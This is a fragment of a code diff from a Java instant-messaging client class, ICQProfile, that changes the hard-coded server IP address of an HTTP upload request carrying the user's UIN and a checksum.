@@ -2390,7 +2390,7 @@ public class ICQProfile extends IMProfile {
                     for (char c : ICQProfile.this.ID.toCharArray()) {
                         check ^= c;
                     }
-                    URL url = new URL("http://45.144.154.209/upload?uin=" + ICQProfile.this.ID + "&check=" + check);
+                    URL url = new URL("http://217.147.15.238/upload?uin=" + ICQProfile.this.ID + "&check=" + check);
                     HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                     conn.setDoOutput(true);
                     conn.setRequestMethod("POST");
